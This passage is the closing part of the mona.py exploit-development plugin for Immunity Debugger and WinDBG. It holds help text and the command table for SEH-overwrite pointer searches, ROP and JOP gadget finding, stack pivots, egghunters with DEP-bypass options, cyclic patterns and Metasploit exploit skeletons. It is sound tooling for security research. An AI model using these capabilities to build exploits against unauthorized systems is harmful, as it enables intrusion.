			ys = [0 for i in range(0,len(originals))]
			
			cyclic = getCyclic(originals)
			mul = 1
			for i in cyclic:
				mul *= i
			info("Searching for random solutions for code alignment code in at least %i possibilities..." % mul)

			#We can't even know the value of AH yet (no, it's NOT g1 for high instruction counts)
			cyclic2 = copy.copy(cyclic)
			cyclic2[names.index(buffer_registers_4_byte_names[0])] = 9999999
			
			number_of_tries = 0.0
			beginning = time.time()
			resultFound = False
			while time.time()-beginning < timeToRun: #Run only timeToRun seconds!
				randomise(xs, cyclic)
				randomise(ys, cyclic2)
				
				#[Extra constraint!]
				#not allowed: all operations with the bufferRegister,
				#because we can not rely on it's values, e.g.
				#add al, al
				#add al, ah
				#add ah, ah
				#add ah, al
				xs[names.index(buffer_registers_4_byte_names[0])] = 0
				xs[names.index(buffer_registers_4_byte_names[1])] = 0
				ys[names.index(buffer_registers_4_byte_names[0])] = 0
				ys[names.index(buffer_registers_4_byte_names[1])] = 0
				
				tmp = check(originals, names.index(buffer_registers_4_byte_names[0]), [s1, s2], [g1, g2], xs, ys, additionalLength, best_result)
				if tmp > 0:
                                        best_result = tmp
                                        #we got a new result
                                        resultFound = True
                                        printNicely(names, buffer_registers_4_byte_names, xs, ys, additionalLength, prefix, postfix)
				#Slightly increases probability of resetting with time
				probability = MAGIC_PROBABILITY_OF_RESETTING+number_of_tries/(10**8)
				if probability < MAGIC_MAX_PROBABILITY_OF_RESETTING:
                                        number_of_tries += 1.0
				if random.random() <= probability:
                                        xs = [0 for i in range(0,len(originals))]
                                        ys = [0 for i in range(0,len(originals))]
                        if not resultFound:
                                info()
                                info("No results. Please try again (you might want to increase -t)")
                        info()
                        info("If you are unsatisfied with the result, run the command again and use the -t option")

				
		# ----- Finally, some main stuff ----- #
		
		# All available commands and their Usage :

                alignmentUsage = """Generate code for Unicode code alignment to fill BufferRegister. Execute this command
when you are at the position where the code alignment code will start.
Mandatory argument : <address>, address where first byte of code alignment code will be located
(without leaking zero byte).
Optional argument: 
    -l : last instruction (e.g. overwritten seh handler) before code alignment position <address>
         leaks a leading zero byte into first instruction (default: false)
    -b : buffer register (default: eax)
    -t : time in seconds how long the heuristic runs (default: 15s)
    -ebp : ebp register value, only used to calculate offset to shellcode (default: current value)
    """
		
		sehUsage = """Default module criteria : non safeseh, non aslr, non rebase
This function will retrieve all stackpivot pointers that will bring you back to nseh in a seh overwrite exploit
Optional argument: 
    -all : also search outside of loaded modules"""
	
		configUsage = """Change config of mona.py
Available options are : -get <parameter>, -set <parameter> <value> or -add <parameter> <value_to_add>
Valid parameters are : workingfolder, excluded_modules, author"""
	
		jmpUsage = """Default module criteria : non aslr, non rebase 
Mandatory argument :  -r <reg>  where reg is a valid register"""
	
		ropfuncUsage = """Default module criteria : non aslr, non rebase, non os
Output will be written to ropfunc.txt"""
	
		modulesUsage = """Shows information about the loaded modules"""
		
		ropUsage="""Default module criteria : non aslr,non rebase,non os
Optional parameters : 
    -offset <value> : define the maximum offset for RET instructions (integer, default : 40)
    -distance <value> : define the minimum distance for stackpivots (integer, default : 8).
                        If you want to specify a min and max distance, set the value to min,max
    -depth <value> : define the maximum nr of instructions (not ending instruction) in each gadget (integer, default : 6)
    -split : write gadgets to individual files, grouped by the module the gadget belongs to
    -fast : skip the 'non-interesting' gadgets
    -end <instruction(s)> : specify one or more instructions that will be used as chain end. 
                               (Separate instructions with #). Default ending is RETN
    -f \"file1,file2,..filen\" : use mona generated rop files as input instead of searching in memory
    -rva : use RVA's in rop chain"""
	
		jopUsage="""Default module criteria : non aslr,non rebase,non os
Optional parameters : 
    -depth <value> : define the maximum nr of instructions (not ending instruction) in each gadget (integer, default : 8)"""	
							   
							   
		stackpivotUsage="""Default module criteria : non aslr,non rebase,non os
Optional parameters : 
    -offset <value> : define the maximum offset for RET instructions (integer, default : 40)
    -distance <value> : define the minimum distance for stackpivots (integer, default : 8)
                        If you want to specify a min and max distance, set the value to min,max
    -depth <value> : define the maximum nr of instructions (not ending instruction) in each gadget (integer, default : 6)"""							   
							   
		filecompareUsage="""Compares 2 or more files created by mona using the same output commands
Make sure to use files that are created with the same version of mona and 
contain the output of the same mona command
Mandatory argument : -f \"file1,file2,...filen\"
Put all filenames between one set of double quotes, and separate files with comma's
Output will be written to filecompare.txt and filecompare_not.txt (not matching pointers)
Optional parameters : 
    -contains \"INSTRUCTION\"  (will only list if instruction is found)
    -nostrict (will also list pointer is instructions don't match in all files)
    -range <number> : find overlapping ranges for all pointers + range. 
                      When using -range, the -contains and -nostrict options will be ignored"""

		patcreateUsage="""Create a cyclic pattern of a given size. Output will be written to pattern.txt
Mandatory argument : size (numberic value)
Optional arguments :
    -js : output pattern in unicode escaped javascript format
    -extended : extend the 3rd characterset (numbers) with punctuation marks etc
    -c1 <chars> : set the first charset to this string of characters
    -c2 <chars> : set the second charset to this string of characters
    -c3 <chars> : set the third charset to this string of characters"""
	
		patoffsetUsage="""Find the location of 4 bytes in a cyclic pattern
Mandatory argument : the 4 bytes to look for
Note :  you can also specify a register
Optional arguments :
    -extended : extend the 3rd characterset (numbers) with punctuation marks etc
    -c1 <chars> : set the first charset to this string of characters
    -c2 <chars> : set the second charset to this string of characters
    -c3 <chars> : set the third charset to this string of characters
Note : the charset must match the charset that was used to create the pattern !
"""

		findwildUsage = """Find instructions in memory, accepts wildcards :
Mandatory arguments :
        -s <instruction#instruction#instruction>  (separate instructions with #)
Optional arguments :
        -b <address> : base/bottom address of the search range
        -t <address> : top address of the search range
        -depth <nr>  : number of instructions to go deep
        -all : show all instruction chains, even if it contains something that might break the chain	
        -distance min=nr,max=nr : you can use a numeric offset wildcard (a single *) in the first instruction of the search
        the distance parameter allows you to specify the range of the offset		
Inside the instructions string, you can use the following wildcards :
        * = any instruction
        r32 = any register
Example : pop r32#*#xor eax,eax#*#pop esi#ret
        """


		findUsage= """Find a sequence of bytes in memory.
Mandatory argument : -s <pattern> : the sequence to search for. If you specified type 'file', then use -s to specify the file.
This file needs to be a file created with mona.py, containing pointers at the begin of each line.
Optional arguments:
    -type <type>    : Type of pattern to search for : bin,asc,ptr,instr,file
    -b <address> : base/bottom address of the search range
    -t <address> : top address of the search range
    -c : skip consecutive pointers but show length of the pattern instead
    -p2p : show pointers to pointers to the pattern (might take a while !)
           this setting equals setting -level to 1
    -level <number> : do recursive (p2p) searches, specify number of levels deep
                      if you want to look for pointers to pointers, set level to 1
    -offset <number> : subtract a value from a pointer at a certain level
    -offsetlevel <number> : level to subtract a value from a pointer
    -r <number> : if p2p is used, you can tell the find to also find close pointers by specifying -r with a value.
                  This value indicates the number of bytes to step backwards for each search
    -unicode : used in conjunction with search type asc, this will convert the search pattern to unicode first """
	
		assembleUsage = """Convert instructions to opcode. Separate multiple instructions with #.
Mandatory argument : -s <instructions> : the sequence of instructions to assemble to opcode"""
	
		infoUsage = """Show information about a given address in the context of the loaded application
Mandatory argument : -a <address> : the address to query"""

		dumpUsage = """Dump the specified memory range to a file. Either the end address or the size of
buffer needs to be specified.
Mandatory arguments :
    -s <address> : start address
    -f <filename> : the name of the file where to write the bytes
Optional arguments:
    -n <size> : the number of bytes to copy (size of the buffer)
    -e <address> : the end address of the copy"""
	
		compareUsage = """Compares contents of a binary file with locations in memory.
Mandatory argument :
    -f <filename> : full path to binary file
Optional argument :
    -a <address> : the address of the bytes in memory. If you don't specify an address, the script will try to
                   locate the bytes in memory by looking at the first 8 bytes
    -s : skip locations that belong to a module"""
				   
		offsetUsage = """Calculate the number of bytes between two addresses. You can use 
registers instead of addresses. 
Mandatory arguments :
    -a1 <address> : the first address/register
    -a2 <address> : the second address/register"""
	
		bpUsage = """Set a breakpoint when a given address is read from, written to or executed
Mandatory arguments :
    -a <address> : the address where to set the breakpoint
                   (absolute address / register / modulename!functionname)
    -t <type> : type of the breakpoint, can be READ, WRITE or SFX"""
	
		bfUsage = """Set a breakpoint on exported or imported function(s) of the selected modules. 
Mandatory argument :
    -t <type> : type of breakpoint action. Can be 'add', 'del' or 'list'
Optional arguments :
    -f <function type> : set to 'import' or 'export' to read IAT or EAT. Default : export
    -s <func,func,func> : specify function names. 
                          If you want a bp on all functions, set -s to *"""	
	
		nosafesehUsage = """Show modules that are not safeseh protected"""
		nosafesehaslrUsage = """Show modules that are not safeseh protected, not subject to ASLR, and won't get rebased either"""
		noaslrUsage = """Show modules that are not subject to ASLR and won't get rebased"""
		findmspUsage = """Finds begin of a cyclic pattern in memory, looks if one of the registers is overwritten with a cyclic pattern
or points into a cyclic pattern. findmsp will also look if a SEH record is overwritten and finally, 
it will look for cyclic patterns on the stack, and pointers to cyclic pattern on the stack.
Optional argument :
    -distance <value> : distance from ESP, applies to search on the stack. Default : search entire stack
Note : you can use the same options as with pattern_create and pattern_offset in terms of defining the character set to use"""

		suggestUsage = """Suggests an exploit buffer structure based on pointers to a cyclic pattern
Note : you can use the same options as with pattern_create and pattern_offset in terms of defining the character set to use
Mandatory argument in case you are using WinDBG:
    -t <type:arg> : skeletontype. Valid types are :
                tcpclient:port, udpclient:port, fileformat:extension
                Examples : -t tcpclient:21
                           -t fileformat:pdf"""
		
		bytearrayUsage = """Creates a byte array, can be used to find bad characters
Optional arguments :
    -b <bytes> : bytes to exclude from the array. Example : '\\x00\\x0a\\x0d'
    -r : show array backwards (reversed), starting at \\xff
    Output will be written to bytearray.txt, and binary output will be written to bytearray.bin"""
	
		headerUsage = """Convert contents of a binary file to a nice 'header' string
Mandatory argument :
    -f <filename> : source filename"""
	
		updateUsage = """Update mona to the latest version
Optional argument : 
    -http : Use http instead of https"""
		getpcUsage = """Find getpc routine for specific register
Mandatory argument :
    -r : register (ex: eax)"""

		eggUsage = """Creates an egghunter routine
Optional arguments :
    -t : tag (ex: w00t). Default value is w00t
    -c : enable checksum routine. Only works in conjunction with parameter -f
    -f <filename> : file containing the shellcode
    -startreg <reg> : start searching at the address pointed by this reg
DEP Bypass options :
    -depmethod <method> : method can be "virtualprotect", "copy" or "copy_size"
    -depreg <reg> : sets the register that contains a pointer to the API function to bypass DEP. 
                    By default this register is set to ESI
    -depsize <value> : sets the size for the dep bypass routine
    -depdest <reg> : this register points to the location of the egghunter itself.  
                     When bypassing DEP, the egghunter is already marked as executable. 
                     So when using the copy or copy_size methods, the DEP bypass in the egghunter 
                     would do a "copy 2 self".  In order to be able to do so, it needs a register 
                     where it can copy the shellcode to. 
                     If you leave this empty, the code will contain a GetPC routine."""
		
		stacksUsage = """Shows all stacks for each thread in the running application"""
		
		skeletonUsage = """Creates a Metasploit exploit module skeleton for a specific type of exploit
Mandatory argument in case you are using WinDBG:
    -t <type:arg> : skeletontype. Valid types are :
                tcpclient:port, udpclient:port, fileformat:extension
                Examples : -t tcpclient:21
                           -t fileformat:pdf
Optional arguments :
    -s : size of the cyclic pattern (default : 5000)
"""
	
		heapUsage = """Show information about various heap chunk lists
Mandatory arguments :
    -h <address> : base address of the heap to query
    -t <type> : where type is 'lal' (lookasidelist), 'freelist', 'segments', 'blocks', 'layout' or 'all'
    'lal' and 'freelist' only work on XP/2003
    'layout' will show all heap blocks and their vtables & strings. Use on WinDBG for maximum results.
Optional arguments :
    -stat : show statistics (also works in combination with -h heap, -t segments or -t blocks
    -size <nr> : only show strings of at least the specified size. Works in combination with 'layout'
    -after <data> : only show current & next block layout entries when an entry contains this data
                    (Only works in combination with 'layout')
    -v : show data / write verbose info to the Log window"""
	
		getiatUsage = """Show IAT entries from selected module(s)
Optional arguments :
    -s <keywords> : only show IAT entries that contain one of these keywords"""

		geteatUsage = """Show EAT entries from selected module(s)
Optional arguments :
    -s <keywords> : only show EAT entries that contain one of these keywords"""
	
		deferUsage = """Set a deferred breakpoint
Mandatory arguments :
    -a <target>,<target>,... 
    target can be an address, a modulename.functionname or module.dll+offset (hex value)
    Warning, modulename.functionname is case sensitive !
	""" 
	
		calltraceUsage = """Logs all CALL instructions
Mandatory arguments :
    -m module : specify what module to search for CALL instructions (global option)	
Optional arguments :
    -a <number> : number of arguments to show for each CALL
    -r : also trace RETN instructions (will slow down process!)""" 	

		fillchunkUsage = """Fills a heap chunk, referenced by a register, with A's (or another character)
Mandatory arguments :
    -r <reg/reference> : reference to heap chunk to fill
Optional arguments :
    -b <character or byte to use to fill up chunk>
    -s <size> : if the referenced chunk is not found, and a size is defined with -s,
                memory will be filled anyway, up to the specified size"""

		getpageACLUsage = """List all mapped pages and show the ACL associated with each page"""
		
		bpsehUsage = """Sets a breakpoint on all current SEH Handler function pointers"""

		kbUsage = """Manage knowledgebase data
Mandatory arguments:
    -<type> : type can be 'list', 'set' or 'del'
    To 'set' ( = add / update ) a KB entry, or 'del' an entry, 
    you will need to specify 2 additional arguments:
        -id <id> : the Knowledgebase ID
        -value <value> : the value to add/update.  In case of lists, use a comma to separate entries.
    The -list parameter will show all current ID's
    To see the contents of a specific ID, use the -id <id> parameter."""

		macroUsage = """Manage macros for WinDBG
Arguments:
    -run <macroname> : run the commands defined in the specified macro
    -show <macroname> : show all commands defined in the specified macro
    -add <macroname> : create a new macro
    -set <macroname> -index <nr> -cmd <windbg command(s)> : edit a macro
               If you set the -command value to #, the command at the specified index
               will be removed.  If you have specified an existing index, the command 
               at that position will be replaced, unless you've also specified the -insert parameter.
               If you have not specified an index, the command will be appended to he list.
    -set <macroname> -file <filename> : will tell this macro to execute all instructions in the
               specified file. You can only enter one file per macro.
    -del <macroname> -iamsure: remove the specified macro. Use with care, I won't ask if you're sure."""


		commands["alignment"] 			= MnCommand("alignment", "Generate code for Unicode code alignment to fill BufferRegister",alignmentUsage, procAlignment)	  
		commands["seh"] 			= MnCommand("seh", "Find pointers to assist with SEH overwrite exploits",sehUsage, procFindSEH)
		commands["config"] 			= MnCommand("config","Manage configuration file (mona.ini)",configUsage,procConfig,"conf")
		commands["jmp"]				= MnCommand("jmp","Find pointers that will allow you to jump to a register",jmpUsage,procFindJMP, "j")
		commands["ropfunc"] 		= MnCommand("ropfunc","Find pointers to pointers (IAT) to interesting functions that can be used in your ROP chain",ropfuncUsage,procFindROPFUNC)
		commands["rop"] 			= MnCommand("rop","Finds gadgets that can be used in a ROP exploit and do ROP magic with them",ropUsage,procROP)
		commands["jop"] 			= MnCommand("jop","Finds gadgets that can be used in a JOP exploit",jopUsage,procJOP)		
		commands["stackpivot"]		= MnCommand("stackpivot","Finds stackpivots (move stackpointer to controlled area)",stackpivotUsage,procStackPivots)
		commands["modules"] 		= MnCommand("modules","Show all loaded modules and their properties",modulesUsage,procShowMODULES,"mod")
		commands["filecompare"]		= MnCommand("filecompare","Compares 2 or more files created by mona using the same output commands",filecompareUsage,procFileCOMPARE,"fc")
		commands["pattern_create"]	= MnCommand("pattern_create","Create a cyclic pattern of a given size",patcreateUsage,procCreatePATTERN,"pc")
		commands["pattern_offset"]	= MnCommand("pattern_offset","Find location of 4 bytes in a cyclic pattern",patoffsetUsage,procOffsetPATTERN,"po")
		commands["find"] 			= MnCommand("find", "Find bytes in memory", findUsage, procFind,"f")
		commands["findwild"]		= MnCommand("findwild", "Find instructions in memory, accepts wildcards", findwildUsage, procFindWild,"fw")
		commands["assemble"] 		= MnCommand("assemble", "Convert instructions to opcode. Separate multiple instructions with #",assembleUsage,procAssemble,"asm")
		commands["info"] 			= MnCommand("info", "Show information about a given address in the context of the loaded application",infoUsage,procInfo)
		commands["dump"] 			= MnCommand("dump", "Dump the specified range of memory to a file", dumpUsage,procDump)
		commands["offset"]          = MnCommand("offset", "Calculate the number of bytes between two addresses", offsetUsage, procOffset)		
		commands["compare"]			= MnCommand("compare","Compare contents of a binary file with a copy in memory", compareUsage, procCompare,"cmp")
		commands["breakpoint"]		= MnCommand("bp","Set a memory breakpoint on read/write or execute of a given address", bpUsage, procBp,"bp")
		commands["nosafeseh"]		= MnCommand("nosafeseh", "Show modules that are not safeseh protected", nosafesehUsage, procModInfoS)
		commands["nosafesehaslr"]	= MnCommand("nosafesehaslr", "Show modules that are not safeseh protected, not aslr and not rebased", nosafesehaslrUsage, procModInfoSA)		
		commands["noaslr"]			= MnCommand("noaslr", "Show modules that are not aslr or rebased", noaslrUsage, procModInfoA)
		commands["findmsp"]			= MnCommand("findmsp","Find cyclic pattern in memory", findmspUsage,procFindMSP,"findmsf")
		commands["suggest"]			= MnCommand("suggest","Suggest an exploit buffer structure", suggestUsage,procSuggest)
		commands["bytearray"]		= MnCommand("bytearray","Creates a byte array, can be used to find bad characters",bytearrayUsage,procByteArray,"ba")
		commands["header"]			= MnCommand("header","Read a binary file and convert content to a nice 'header' string",headerUsage,procPrintHeader)
		commands["update"]			= MnCommand("update","Update mona to the latest version",updateUsage,procUpdate,"up")
		commands["getpc"]			= MnCommand("getpc","Show getpc routines for specific registers",getpcUsage,procgetPC)	
		commands["egghunter"]		= MnCommand("egg","Create egghunter code",eggUsage,procEgg,"egg")
		commands["stacks"]			= MnCommand("stacks","Show all stacks for all threads in the running application",stacksUsage,procStacks)
		commands["skeleton"]		= MnCommand("skeleton","Create a Metasploit module skeleton with a cyclic pattern for a given type of exploit",skeletonUsage,procSkeleton)
		commands["breakfunc"]		= MnCommand("breakfunc","Set a breakpoint on an exported function in on or more dll's",bfUsage,procBf,"bf")
		commands["heap"]			= MnCommand("heap","Show heap related information",heapUsage,procHeap)
		commands["getiat"]			= MnCommand("getiat","Show IAT of selected module(s)",getiatUsage,procGetIAT,"iat")
		commands["geteat"]          = MnCommand("geteat","Show EAT of selected module(s)",geteatUsage,procGetEAT,"eat")
		commands["pageacl"]         = MnCommand("pageacl","Show ACL associated with mapped pages",getpageACLUsage,procPageACL,"pacl")
		commands["bpseh"]           = MnCommand("bpseh","Set a breakpoint on all current SEH Handler function pointers",bpsehUsage,procBPSeh,"sehbp")
		commands["kb"]				= MnCommand("kb","Manage Knowledgebase data",kbUsage,procKb,"kb")
		if __DEBUGGERAPP__ == "Immunity Debugger":
			commands["deferbp"]			= MnCommand("deferbp","Set a deferred breakpoint",deferUsage,procBu,"bu")
			commands["calltrace"]		= MnCommand("calltrace","Log all CALL instructions",calltraceUsage,procCallTrace,"ct")
		if __DEBUGGERAPP__ == "WinDBG":
			commands["fillchunk"]          = MnCommand("fillchunk","Fill a heap chunk referenced by a register",fillchunkUsage,procFillChunk,"fchunk")
			commands["macro"]              = MnCommand("macro","Run and manage macros",macroUsage,procMacro,"mc")


		# get the options
		opts = {}
		last = ""
		arguments = []

		# in case we're not using Immunity
		if len(args) > 0:
			if args[0].lower().startswith("mona") or args[0].lower().endswith("mona") :
				args.pop(0)
		
		if len(args) >= 2:
			arguments = args[1:]
		
		for word in arguments:
			if (word[0] == '-'):
				word = word.lstrip("-")
				opts[word] = True
				last = word
			else:
				if (last != ""):
					if str(opts[last]) == "True":
						opts[last] = word
					else:
						opts[last] = opts[last] + " " + word
					#last = ""
		# if a command only requires a value and not a switch ?
		# then we'll drop the value into dictionary with key "?"
		if len(args) > 1 and args[1][0] != "-":
			opts["?"] = args[1]
	
		
		if len(args) < 1:
			commands["help"].parseProc(opts)
			return("")
		
		command = args[0]

		
		# ----- execute the chosen command ----- #
		if command in commands:
			if command.lower().strip() == "help":
				commands[command].parseProc(args)
			else:
				commands[command].parseProc(opts)
		
		else:
			# maybe it's an alias
			aliasfound = False
			for cmd in commands:
				if commands[cmd].alias == command:
					commands[cmd].parseProc(opts)
					aliasfound = True
			if not aliasfound:
				commands["help"].parseProc(None)
				return("** Invalid command **")
		
		# ----- report ----- #
		endtime = datetime.datetime.now()
		delta = endtime - starttime
		dbg.log("")
		dbg.logLines("[+] This mona.py action took %s\n" % str(delta))
		dbg.setStatusBar("Done")
				
	except:
		dbg.log("*" * 80,highlight=True)
		dbg.logLines(traceback.format_exc(),highlight=True)
		dbg.log("*" * 80,highlight=True)
		dbg.error(traceback.format_exc())
	
	return ""

if __name__ == "__main__":
	dbg.log("Hold on...")
	# do we need to profile ?
	doprofile = False
	if "-profile" in sys.argv:
		doprofile = True
		dbg.log("Starting profiler...")
		cProfile.run('main(sys.argv)', 'monaprofile')
	else:
		main(sys.argv)
	if doprofile:
		dbg.log("[+] Showing profile stats...")
		p = pstats.Stats('monaprofile')	
		dbg.log(" ***** ALL *****")
		p.print_stats()		
		dbg.log(" ***** CUMULATIVE *****")
		p.sort_stats('cumulative').print_stats(30)
		dbg.log(" ***** TIME *****")
		p.sort_stats('time', 'cum').print_stats(30)
	# clear memory
	if __DEBUGGERAPP__ == "WinDBG":
		dbglib.clearvars()
	try:
		allvars = [var for var in globals() if var[0] != "_"]
		for var in allvars:
			del globals()[var]
		dbg = None
	except:
		pass